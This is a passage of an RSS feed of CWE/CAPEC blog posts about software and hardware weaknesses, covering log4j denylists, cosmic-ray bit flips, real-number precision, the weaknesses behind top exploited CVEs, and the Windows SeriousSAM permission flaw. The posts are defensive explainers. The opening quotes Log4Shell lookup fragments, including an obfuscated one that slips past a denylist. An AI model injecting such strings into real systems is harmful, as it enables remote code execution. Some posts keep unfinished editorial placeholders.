<a href="https://cwe.mitre.org/documents/glossary/index.html#Denylist">denylist</a> to reject any inputs that contain “jndi:ldap:” substrings. At best, this is a delaying tactic, not a complete fix, because denylists don’t always remove every possible “bad” input (<a href="https://cwe.mitre.org/data/definitions/184.html">CWE-184</a>). For example, “${jndi:ldap:…” <a href="https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html">could be encoded</a> as “${${::-j}ndi:…” — i.e. a nested expression would be called that would just produce the “j” in the “jndi”.</p><p>As we’ve seen with log4j, and with lots of other software, when addressing a vulnerability, it is important to identify and mitigate the root cause weakness that starts the problem and not one of the resultant weaknesses that appear later in the chain. There might be alternative ways to instantiate those weaknesses, leading to another round of patching and testing.</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=89954c8b25c9" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Don’t forget to protect your hardware from the power cosmic]]></title>
      <link>https://medium.com/@CWE_CAPEC/dont-forget-to-protect-your-hardware-from-the-power-cosmic-6529bd2f34f8?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/6529bd2f34f8</guid>
      <category><![CDATA[hardware-design]]></category>
      <category><![CDATA[data]]></category>
      <category><![CDATA[cybersecurity]]></category>
      <category><![CDATA[hardware]]></category>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Thu, 09 Dec 2021 22:01:27 GMT</pubDate>
      <atom:updated>2021-12-10T16:01:48.876Z</atom:updated>
      <content:encoded><![CDATA[<figure><img alt="" src="https://cdn-images-1.medium.com/max/480/1*mHIWG2J9acEqE3SXNihurg.png" /><figcaption>Photo credit: <a href="https://owlcation.com/stem/What-Are-Cosmic-Rays-and-What-do-They-Reveal-About-the-Universe">https://owlcation.com/stem/What-Are-Cosmic-Rays-and-What-do-They-Reveal-About-the-Universe</a></figcaption></figure><p>If you are making hardware that will be relied on for calculations or that could impact lives or money, you need to make sure that these products can recover from a single event upset (<a href="https://en.wikipedia.org/wiki/Single-event_upset">SEU</a>). An SEU happens when a single bit is flipped in hardware as a result of being struck by an ionizing particle-like cosmic rays and radiation.</p><p>To provide a clearer picture, a single bit flip in an industrial control system could cause serious harm while a single bit flip in an authentication process could lead to elevation of privilege allowing an attacker or a process access to areas that might bypass controls. The identification of these types of anomalies goes back to at least the 1970’s with alpha particles generated by radioactively contaminated epoxy used for static RAM chip encapsulation, which caused random bit <a href="https://en.wikipedia.org/wiki/Soft_error#Alpha_particles_from_package_decay">upsets</a>.</p><p><strong>The Real Trouble with SEUs</strong></p><p>While not a critical system, a Super Mario Bros. Speedrunner (a competition for finishing the game in the minimum amount of time) example illustrates the strange impacts that can occur from SEUs. A player was able to move his character onto a higher <a href="https://www.pcgamer.com/cosmic-rays-cause-tech-bit-flips-blue-screen-of-death/">platform</a> that scored the quickest complete time. When no one could replicate this glitch, research determined that a single bit flip was responsible and unlikely <a href="https://www.pcgamer.com/cosmic-rays-cause-tech-bit-flips-blue-screen-of-death/">occurrence</a> of a SEU occurred.</p><p>For enterprise computing, SEUs can cause all kinds of issues. This <a href="https://blogs.oracle.com/linux/post/attack-of-the-cosmic-rays">2010 blog from Oracle</a> discusses a bit flip that occurred during the installation of a binary in Debian that caused a segmentation fault error. While it can’t be proved that the SEU came from radiation, a bit was flipped. <a href="https://www.wired.com/story/cosmic-ray-showers-crash-supercomputers-heres-what-to-do-about-it/">SEUs</a> are also happening in supercomputers at Los Alamos National Lab. For an audio version of some of the cases involving impossible vote counts (beware of vote errors in powers of 2) and deaths due to a breaking malfunction, go <a href="https://www.wnycstudios.org/podcasts/radiolab/articles/bit-flip">here</a>.</p><p>In the medical field, implantable hardware needs to be protected against SEUs. This <a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=736549&amp;tag=1">paper</a> discusses SEUs in implantable cardioverter defibrillators, and the effect of radiation applied to ICDs based on a natural source, packaging sources, or radiological therapeutic sources. They attempt to calculate a frequency of upsets based on treatments that contain radiation.</p><p>There are even regulations in space and aerospace. In 2008, a plane from Singapore to Sydney experienced a bit flip that dropped the plane 656 feet in 20 seconds and injured <a href="https://www.pcgamer.com/cosmic-rays-cause-tech-bit-flips-blue-screen-of-death/">passengers</a>. In high altitude applications, these errors can occur frequently. NASA has a whole <a href="https://www.nasa.gov/feature/how-nasa-prepares-spacecraft-for-the-harsh-radiation-of-space">lab</a> to test this in Greenbelt, MD. The LEON GR740, for example, is the latest European space-grade processor. The device is estimated to experience a <a href="https://arstechnica.com/science/2019/11/space-grade-cpus-how-do-you-send-more-computing-power-into-space/">staggering</a> 9 SEUs a day on a geostationary Earth orbit.</p><p><strong>How to Prevent or Recover from SEUs</strong></p><p>The first thing you can do is design chips to be radiation hardened by design (RHBD). This <a href="https://ieeexplore.ieee.org/document/7208046">paper</a> discusses methods on how to harden inverter, NOR and NAND gates. A second method is to use <a href="https://en.wikipedia.org/wiki/Triple_modular_redundancy">triple module redundancy</a>. This technique involves a voting scheme where calculation is done by three different logic gates or computers, and when at least two of the three agree, an answer is provided. This can be extended to a <a href="https://dl.acm.org/doi/10.1145/571637.571640">Byzantine Fault Tolerance algorithm</a> across multiple voters with a maximum number of faulty voters.</p><p>The real questions are, what is the risk of failure, and is it worth the cost of protecting against this weakness? If your system is a simple toy, there is no need for protection. If your system involves a medical device keeping a person alive, the cost might be priceless.</p><p>In the case of bit flipping in <a href="https://www.eetimes.com/toyota-case-single-bit-flip-that-killed/">Toyota Camry</a>, experts determined that the inability to deal with a bit flip triggered liability on Toyota’s behalf for unintended acceleration. Make sure that your design or the hardware that you are purchasing has mitigations to prevent <a href="https://cwe.mitre.org/data/definitions/1261.html">CWE-1261: Improper Handling of Single Event Upsets</a>. Don’t be the person who brings liability to your company for hardware that won’t handle a SEU.</p><p>From a <a href="http://www.mitre.capec.org">CAPEC</a> perspective, these single errors have not been generated by attackers, and there are no known techniques for reliably generating such upsets, so there are no attack patterns defined. Adversaries are most likely not going to irradiate hardware intentionally to cause errors (although this would make a fun movie scene). Despite this, nature has a funny way of causing errors in strange places that cascade into serious errors with reliability implications. So, if you are making hardware, make sure that it meets the needs of its intended environment</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=6529bd2f34f8" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[New Math: Don’t let real numbers cause the loss of real lives or money]]></title>
      <link>https://medium.com/@CWE_CAPEC/new-math-dont-let-real-numbers-cause-the-loss-of-real-lives-or-money-7e58e12bcd3e?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/7e58e12bcd3e</guid>
      <category><![CDATA[cybersecurity]]></category>
      <category><![CDATA[information-technology]]></category>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Tue, 02 Nov 2021 20:52:47 GMT</pubDate>
      <atom:updated>2021-11-30T15:32:57.664Z</atom:updated>
      <content:encoded><![CDATA[<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*i-i0fzeyzr7V5dmp9OD9ug.jpeg" /></figure><p>Have you ever written a program where you were sure your math was right, but it came out wrong? Often, it’s not the math that is wrong. This is programmer error, not an error of rounding with the implementation. If you are doing calculations that count for lives or money, you need to check how you are representing real numbers in repeated series, or you could calculate the wrong numbers leading to serious problems. Previously, a programming language named <a href="https://en.wikipedia.org/wiki/COBOL">COBOL</a> allowed for unusual controls around the accuracy for non-whole numbers.</p><p>In Marianne Bellotti’s <a href="https://medium.com/the-technical-archaeologist/is-cobol-holding-you-hostage-with-math-5498c0eb428b">Is COBOL holding you hostage with Math?</a>, significant math discrepancies occur in three cases. This type of error <a href="https://www3.nd.edu/~markst/cast-award-speech.pdf">caused a patriot missile to kill 28 people in 1991</a> and <a href="https://www.studocu.com/en-us/document/george-mason-university/numerical-analysis/lecture-notes-lecture-some-disasters-caused-by-numerical-errors-numerical-analysis-math-685/773904">$700M in damage during the construction of an offshore oil rig</a>. The article states that the implementation of real numbers is also preventing the IRS from moving from COBOL to high-performance computing. Other use cases that can be affected include machine learning solutions that don’t scale and some smart contract that pays 20 times what it should. This weakness is a recent one added to the CWE corpus, <a href="https://cwe.mitre.org/data/definitions/1339.html">CWE-1339: Insufficient Precision or Accuracy of a Real Number</a></p><p>To confirm this issue was real, I wrote a program in Rust on a Windows 10 O.S. This program calculated something called the <a href="https://latkin.org/blog/2014/11/22/mullers-recurrence-roundoff-gone-wrong/">Muller’s Recurrence</a>. It is a simple formula that when executed should converge to 5 as the number of iterations increase. First, I tried a floating number represented with 64 bits. The limit was 11 iterations before the number stopped converging at 5. Next, I tried a bunch of 128-bit floats with a fixed number of bits for the decimal. Even at 112 bits, I could not go past 25 iterations without getting a number that shoots over 5.</p><p>The next method of storing reals is to store it in a fraction of two integers. Trying this with 32-bit integers, the math breaks at 12 iterations moving to a value over 10. The maximum value of a 32-bit number is 2,147,483,647. Using 64-bit integers, the math breaks at 26. The maximum value of a 64-bit number is 9,223,372,036,854,775,807. The most disturbing part of these ratios is that when they go bad, they do not converge to an obviously bad number but jump around.</p><p>Then, I pulled out the big guns and used a BigInt for the integers in the ratio. A BigInt in Rust is a number that is represented with a vector of digits that are base 2³². A maximum BigInt is about 3.96 * 10²⁸. This implementation worked all the way to 800 iterations (only 80 iterations are shown on the graph below).</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/639/1*7Ab5DJZSWNW7h3vIn9s2sA.png" /></figure><p>This recurrence should converge to a value of 5. in the graph that while the correct value should converge to 5, some of these implementations fail quickly in a way that is obvious while others fail in ways that provide answers that are close and occasionally fail in spectacular ways. This means that what may look like a simple math recurring math equation might fail and might be hard to detect in test cases.</p><p>As Bellotti highlights in her article, these types of errors could lead to critical systems malfunction and potentially loss of life. The magnitude of these errors could lead to equations that could be off by 20 times, an amount in the finance world that could cause major impact. When writing code that needs to be accurate, make sure you know the limits of the problem you are trying to solve and test up to those limits.</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=7e58e12bcd3e" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[The Most Important CWEs and CAPECs to Pay Attention to When Building Software]]></title>
      <link>https://medium.com/@CWE_CAPEC/the-most-important-cwes-and-capec-items-to-pay-attention-to-when-building-software-abcbea9ef2e0?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/abcbea9ef2e0</guid>
      <category><![CDATA[vulnerability-management]]></category>
      <category><![CDATA[software-development]]></category>
      <category><![CDATA[cyber-security-solutions]]></category>
      <category><![CDATA[cybersecurity]]></category>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Wed, 06 Oct 2021 13:17:53 GMT</pubDate>
      <atom:updated>2021-10-06T20:33:36.993Z</atom:updated>
      <content:encoded><![CDATA[<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*Y6vKUYWtL1QhliiaJWrkRQ.jpeg" /></figure><p>On July 28th, 2021, a joint <a href="https://us-cert.cisa.gov/ncas/alerts/aa21-209a">Cybersecurity Advisory</a> was released by the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the Australian Cyber Security Centre (ACSC), the United Kingdom’s National Cyber Security Centre (NCSC), and the U.S. Federal Bureau of Investigation (FBI) that covered the top routinely exploited vulnerabilities. These were listed by their Common Vulnerability Enumeration (CVE) number in the report.</p><p>This led me to think, what are the vulnerabilities’ underlying weakness types? Moreover, what attack patterns exploit these weakness types? If you are making software, make sure that you include checks for these weaknesses in your development process to prevent these kinds of vulnerabilities.</p><p>1. <strong>Manage your access control issues such as authentication and authorization.</strong> (CVE-2019–11580, CVE-2019–5591, CVE-2020–0688, CVE-2020–12812, CVE-2021–22893, CVE-2021–22894, CVE-2021–22900, CVE-2021–26855, CVE-2021–26858, CVE-2021–27065, CVE-2021–27103) Over a third of the entire Top 30 Vulnerabilities List deals with authentication issues. Many of these are tricky, such as preventing activities after a process should no longer have rights, server-side request forgery and things like code injection. (<a href="https://capec.mitre.org/data/definitions/122.html">CAPEC-122</a>, <a href="https://capec.mitre.org/data/definitions/223.html">CAPEC-233</a>, <a href="https://capec.mitre.org/data/definitions/58.html">CAPEC-58</a>, <a href="https://capec.mitre.org/data/definitions/664.html">CAPEC-664</a>, <a href="https://capec.mitre.org/data/definitions/242.html">CAPEC-242</a>). The key is not to write your own <a href="https://withblue.ink/2020/04/08/stop-writing-your-own-user-authentication-code.html">code</a> unnecessarily and authenticate <a href="https://www.traceable.ai/blog-post/everything-you-need-to-know-about-authentication-and-authorization-in-web-apis">often</a>. (<a href="https://cwe.mitre.org/data/definitions/285.html">CWE-285</a>, <a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287</a>, <a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306</a>, <a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798</a>, <a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a>, <a href="https://cwe.mitre.org/data/definitions/914.html">CWE-914</a>, <a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94</a>)</p><p>2. <strong>Neutralize risky inputs. </strong>(CVE-2018–7600, CVE-2019–0604, CVE-2019–18935, CVE-2020–15505, CVE-2021–21985. CVE-2021–22899, CVE-2021–26857, CVE-2021–27101, CVE-2021–27102, CVE-2021–27104) The second most frequent weakness type (about a third) deals with processing input. Make sure that you are sanitizing input against <a href="https://xkcd.com/327/">SQL injection</a>,(CWE-89) and <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">OS command injections</a> (CWE-78) This should be done with tested frameworks that properly encode or escape output before it is sent to other components like database engines or the shell. Please don’t try to build your own. In addition, deserialization errors came up as an issue in two CVEs. Programs should check data to make sure it has not been <a href="https://www.reblaze.com/blog/serialization-attacks-what-they-are-and-how-to-prevent-them/">tampered</a> or <a href="https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint">replayed</a> (when and how? May be helped by linking to CWE entry) and making sure object fields for deserialization transient to prevent this. Lastly, (<a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20</a>, <a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502</a>, <a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77</a>, <a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78</a>, <a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a>) (<a href="https://capec.mitre.org/data/definitions/153.html">CAPEC-153</a>, <a href="https://capec.mitre.org/data/definitions/267.html">CAPEC-267</a>, <a href="https://capec.mitre.org/data/definitions/586.html">CAPEC-586</a>, <a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66</a>, <a href="https://capec.mitre.org/data/definitions/248.html">CAPEC-248</a>, <a href="https://capec.mitre.org/data/definitions/88.html">CAPEC-88</a>)</p><p>3. <strong>Manage your paths. </strong>(CVE-2018–13379, CVE-2019–11510, CVE-2019–19781, CVE-2019–3396) Be careful when allowing your software to access file or location paths. This is related to about a quarter of the CVEs in the list and consists of items like file paths, search paths, and how systems reach out to include functions from other areas. It is hard to stop the multiple ways of bypassing <a href="https://blog.talosintelligence.com/2020/06/vuln-spotlight-zoom-code-execution-june-2020.html">path traversal</a> controls. (<a href="https://capec.mitre.org/data/definitions/126.html">CAPEC-126</a>, <a href="https://capec.mitre.org/data/definitions/38.html">CAPEC-38</a>, <a href="https://capec.mitre.org/data/definitions/159.html">CAPEC-159</a>, <a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154</a>) Don’t do this yourself. Use a well-tested, well-used library. Also, build tests to abuse these paths, especially when you have code that does things like pull a widget from another <a href="https://cobalt.io/blog/a-pentesters-guide-to-file-inclusion">site</a>. (<a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a>, <a href="https://cwe.mitre.org/data/definitions/427.html">CWE-427</a>, <a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829</a>)</p><p>4. <strong>Manage your memory when accepting input. </strong>(CVE-2017–11882, CVE-2021–22894) Over the last 15 years, memory issues have garnered a lot of attention, so you would think memory weaknesses would be higher on the priority list. One of the two vulnerabilities highlighted a stack buffer overflow dealing with a null terminated string for the font name, so appropriate input management might also catch this. The second vulnerability talks about a maliciously crafted meeting room (<a href="https://capec.mitre.org/data/definitions/100.html">CAPEC-100</a>, <a href="https://capec.mitre.org/data/definitions/135.html">CAPEC-135</a>, <a href="https://capec.mitre.org/data/definitions/153.html">CAPEC-153</a>, <a href="https://capec.mitre.org/data/definitions/538.html">CAPEC-538</a>). While there is no additional detail, my guess is that ensuring the parsing of input data on a meeting room definition correctly would manage this issue. It is important to use proper string libraries that handle all memory issues or use strings of a fixed length (e.g. strncpy). Null terminated strings only lead to sadness (<a href="https://www.youtube.com/watch?v=ibF36Yyeehw">even in certificate names from 2009</a>). (<a href="https://cwe.mitre.org/data/definitions/119.html">CWE-119</a>, <a href="https://cwe.mitre.org/data/definitions/120.html">CWE-120</a>)</p><p>5. <strong>Make sure that you know when you need random numbers and test that they are random. </strong>(CVE-2020–1472) One of the top CVEs was the notorious <a href="https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/">ZeroLogin</a> vulnerability, where an initialization vector was not sufficiently random. Making sure you test that your random number generators work properly is important. Most of the time this is an issue in handling keys or some business logic. A current example is a <a href="https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng">DEFCON 29 talk on poor random number generation in IoT devices</a> addressing the creation of initialization vectors. It is tough to know when random numbers are <a href="https://xkcd.com/221/">properly random</a>. Make sure you are using cryptographically secure pseudo random number generators (CPRNG) in software (<a href="https://capec.mitre.org/data/definitions/112.html">CAPEC-112</a>, <a href="https://capec.mitre.org/data/definitions/20.html">CAPEC-20</a>, <a href="https://capec.mitre.org/data/definitions/97.html">CAPEC-97</a>). Don’t use hardware random number generators directly from hardware as it is very difficult to recover when you get an error (<a href="https://cwe.mitre.org/data/definitions/330.html">CWE- 330 and</a> <a href="https://cwe.mitre.org/data/definitions/1241.html">CWE-1241</a>).</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=abcbea9ef2e0" width="1" height="1" alt="">]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Who Knows What Passwords Lurk in the Heart of Windows? The Shadow Knows!]]></title>
      <link>https://medium.com/@CWE_CAPEC/who-knows-what-passwords-lurk-in-the-heart-of-windows-the-shadow-knows-67ddd7a62ace?source=rss-674e9717194c------2</link>
      <guid isPermaLink="false">https://medium.com/p/67ddd7a62ace</guid>
      <category><![CDATA[microsoft]]></category>
      <category><![CDATA[cybersecurity]]></category>
      <category><![CDATA[zero-day]]></category>
      <category><![CDATA[shadow-copy]]></category>
      <category><![CDATA[information-security]]></category>
      <dc:creator><![CDATA[CWE/CAPEC]]></dc:creator>
      <pubDate>Wed, 11 Aug 2021 23:32:39 GMT</pubDate>
      <atom:updated>2021-08-11T23:47:52.755Z</atom:updated>
      <content:encoded><![CDATA[<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*lsjhiwrTGrp4i0SYIhgA_w.jpeg" /><figcaption><a href="http://www.flickr.com/photos/drainrat/16789985016">www.flickr.com/photos/drainrat/16789985016</a></figcaption></figure><p>File permissions are tricky things. In many systems, they are not part of the file themselves. This means that permissions sometimes get lost when copying files.</p><p>This issue came up recently when Microsoft acknowledged a serious weakness in many versions of its Windows 10 operating system. The weakness, nicknamed <a href="https://redmondmag.com/articles/2021/07/21/serioussam-windows-flaw.aspx">SeriousSAM</a> or <a href="https://nakedsecurity.sophos.com/2021/07/21/windows-hivenightmare-bug-could-leak-passwords-heres-what-to-do/">HiveNightmare</a>, occurs in a Microsoft function that can take snapshots of files, folders, or entire volumes. They call this a <a href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service">shadow copy</a>, and it’s a useful feature for copying and restoring files quickly.</p><p><strong>Shadow Copy Weakness</strong></p><p>When making these shadow copies, the shadow copy software does not always keep the permission structure correct for a series of parts in the critical portion of the operating system (<a href="https://cwe.mitre.org/data/definitions/281.html#:~:text=The%20software%20does%20not%20preserve,less%20restrictive%20permissions%20than%20intended.">CWE-281 Improper Preservation of Permissions</a>). One of the impacted areas is the <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">Security Account Manager (SAM)</a>.</p><p>Normally, the SAM is a protected part of the operating system as it contains hashed passwords and security tokens for all the accounts on the system. When regular users can read this database file, they have access to hashed credentials for accounts with higher levels of permission than the user, like system privileges.</p><p>This attack is labeled <a href="https://capec.mitre.org/data/definitions/647.html">CAPEC-647: Collect Data from Registries</a>. Adversaries can then either relay these tokens in a <a href="https://capec.mitre.org/data/definitions/644.html">Pass the Hash attack (CAPEC-644: Use of Captured Hashes)</a>, access restricted volumes (<a href="https://capec.mitre.org/data/definitions/561.html">CAPEC-561: Windows Admin Shares with Stolen Credentials</a>), and/or reverse the account password hashes and execute a <a href="https://capec.mitre.org/data/definitions/645.html">Kerberos Silver Ticket Attack (CAPEC-645: Use of Captured Tickets)</a>.</p><p><strong>Recommendations for Addressing the Weakness</strong></p><p>Microsoft has put out some <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934">recommendations</a> on how to mitigate this vulnerability. According to the CWE crypto team, this issue could be addressed in the long term by thinking about adding crypto agility, the ability to easily upgrade to more modern hashes to record passwords and tokens.</p><p>Currently, in Windows, hashes are kept in either the archaic <a href="https://en.wikipedia.org/wiki/LAN_Manager">LM</a> hash (which is not a hash) or the current but ineffective <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NTLM</a> hash (Version 1 is not a hash and Version 2 is a weak hash). These are considered relatively weak as they suffer from <a href="https://cwe.mitre.org/data/definitions/328.html">CWE-328: Reversible One-Way Hash</a>, or <a href="https://cwe.mitre.org/data/definitions/916.html">CWE-916: Use of Password Hash with Insufficient Computational Effort</a> depending on the version. They use processes and algorithms such as <a href="https://en.wikipedia.org/wiki/MD5">MD5</a> and <a href="https://en.wikipedia.org/wiki/Data_Encryption_Standard">DES</a>, which are no longer effective due to the advancement of computers.</p><p>It’s important to consider that when Microsoft makes changes it impacts a significant part of the industry, so these changes cannot be made easily. They need to be balanced against other security controls that Microsoft has been providing instead of hardened credentials. Also, change in large ecosystems takes time. NTLMv2 was introduced in 1998 and some systems still need to use the weaker LM hash for compatibility today. Even if the SeriousSAM- or HiveNightmare-relevant hashes are upgraded today, we might still be using NTLMv2 in 2040.</p><p>If possible, consider updating your systems to use more robust password storage algorithms. Many of these resist <a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute forcing</a> (<a href="https://capec.mitre.org/data/definitions/16.html">CAPEC-16: Dictionary-based Password Attack</a>) and the creation of a <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow table</a> (<a href="https://capec.mitre.org/data/definitions/55.html">CAPEC-55: Rainbow Table Password Cracking</a>), such as more <a href="https://medium.com/analytics-vidhya/password-hashing-pbkdf2-scrypt-bcrypt-and-argon2-e25aaf41598e">modern</a> and <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-132.pdf">NIST-approved hashes for the storage of passwords</a> including [insert example(s)]. Some modern hashes use memory-hard functions to make hashing speedups in custom software harder to accomplish. Here is a useful charts on how long it would take to crack <a href="https://www.thesecurityfactory.be/password-cracking-speed/">NTLM</a> passwords of different lengths with different character sets.</p><p>Going forward, when you or your team are building new systems and applications, it is important to consider using modern hashes for the storage of credentials as well as being mindful of both files and their relevant permissions when copying.</p><img src="https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=67ddd7a62ace" width="1" height="1" alt="">]]></content:encoded>
    </item>
  </channel>
</rss>